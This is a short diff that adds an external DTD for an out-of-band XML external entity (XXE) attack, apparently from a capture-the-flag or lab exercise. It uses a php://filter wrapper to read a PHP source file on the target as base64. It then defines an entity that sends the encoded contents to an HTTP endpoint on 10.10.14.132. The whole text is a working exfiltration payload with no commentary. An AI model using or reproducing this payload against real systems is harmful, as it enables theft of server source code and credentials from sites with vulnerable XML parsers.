@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/docx2pdf/getPatent_alphav1.0.php">
+<!ENTITY % read "<!ENTITY exfil SYSTEM 'http://10.10.14.132/exfil?%file;'>">
